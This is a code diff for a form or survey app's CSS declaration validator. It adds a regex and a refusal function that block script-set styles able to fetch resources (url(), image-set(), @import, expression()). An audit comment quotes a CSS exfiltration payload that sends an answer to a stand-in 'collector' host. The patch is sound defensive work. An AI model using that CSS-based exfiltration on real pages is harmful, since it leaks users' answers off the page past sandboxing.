@@ -328,7 +328,20 @@ export interface DeclCheck { ok: Record<string, string>; errors: string[]; warni
  * declaration ({ } ; <), run code (expression(), javascript:, bindings), or
  * load from anywhere but https / an inline image passes.
  */
-export function checkDeclarations(decls: Record<string, unknown>, ctx: { target?: UxTarget; where?: string } = {}): DeclCheck {
+/**
+ * SCRIPT-ORIGINATED STYLES LOAD NOTHING (audit 2026-10-30 D4). A style an author writes in the Style panel is
+ * compiled once, reviewed, and may load an https image. A style a SCRIPT sets is computed at run time — from
+ * answers — and `background-image: url(https://collector/?d=<answer>)` sent the answer off the page through the
+ * real document, past the sandbox. So with `origin: "script"` any value that can make the browser fetch is
+ * refused: url(…), image-set(…) (also -webkit-), @import, expression(…). The refusal names the reason; the caller
+ * logs it to the script console.
+ */
+export const SCRIPT_STYLE_FETCH = /\burl\s*\(|image-set\s*\(|@import|expression\s*\(|\bimage\s*\(|cross-fade\s*\(|\bsrc\s*\(/i;
+export function scriptStyleRefusal(value: string): string | null {
+  return SCRIPT_STYLE_FETCH.test(value) ? "a script cannot load anything through a style — url(), image-set(), @import and expression() are refused in values set from code (an image belongs in the Style panel or the question's media)" : null;
+}
+
+export function checkDeclarations(decls: Record<string, unknown>, ctx: { target?: UxTarget; where?: string; origin?: "author" | "script" } = {}): DeclCheck {
   const ok: Record<string, string> = {}, errors: string[] = [], warnings: string[] = [];
   const at = ctx.where ? `${ctx.where}: ` : "";
   for (const [rawProp, rawVal] of Object.entries(decls ?? {})) {
@@ -336,6 +349,7 @@ export function checkDeclarations(decls: Record<string, unknown>, ctx: { target?
     const value = String(rawVal ?? "").trim();
     if (!PROP_RE.test(prop)) { errors.push(`${at}“${rawProp}” is not a CSS property`); continue; }
     if (BANNED_PROPS.has(prop)) { errors.push(`${at}${prop} is not allowed`); continue; }
+    if (ctx.origin === "script") { const r = scriptStyleRefusal(value); if (r) { errors.push(`${at}${prop}: ${r}`); continue; } }
     const v = checkValue(value);
     if (v) { errors.push(`${at}${prop}: ${v}`); continue; }
     ok[prop] = value;
